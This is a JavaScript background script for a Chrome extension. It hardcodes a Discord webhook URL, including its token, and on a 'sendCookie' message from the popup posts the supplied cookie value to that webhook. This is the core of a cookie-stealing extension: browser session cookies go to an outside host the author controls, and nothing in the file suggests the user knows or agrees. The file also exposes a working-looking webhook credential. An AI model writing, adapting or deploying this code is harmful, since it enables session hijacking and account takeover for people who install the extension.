// Store the webhook URL in Chrome's storage once, or do it dynamically elsewhere in your extension.
chrome.storage.sync.set({ webhookUrl: 'https://discord.com/api/webhooks/1293261110438264913/p0Wx8436uc25-B-CWtAO78nD84Pj7Zqmrb7s1LdfB1xBcTqOYkLDqjspVUlwAi4Qs_-B' }, function () {
  console.log('Webhook URL stored securely.');
});

// Listen for messages from the popup
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === 'sendCookie') {
        // Retrieve the webhook URL from Chrome's storage
        chrome.storage.sync.get('webhookUrl', function (data) {
            const webhookUrl = data.webhookUrl;
            
            if (webhookUrl) {
                // Send cookie to the Discord webhook
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ content: request.cookie })
                })
                .then(response => {
                    if (response.ok) {
                        console.log('Cookie sent successfully!');
                        sendResponse({ success: true });
                    } else {
                        console.error('Error sending cookie:', response.statusText);
                        sendResponse({ success: false });
                    }
                })
                .catch(error => {
                    console.error('Network error:', error);
                    sendResponse({ success: false });
                });
            } else {
                console.error('Webhook URL not found in storage.');
                sendResponse({ success: false, error: 'Webhook URL not found' });
            }
        });

        // Keep the message channel open for sendResponse
        return true;
    }
});
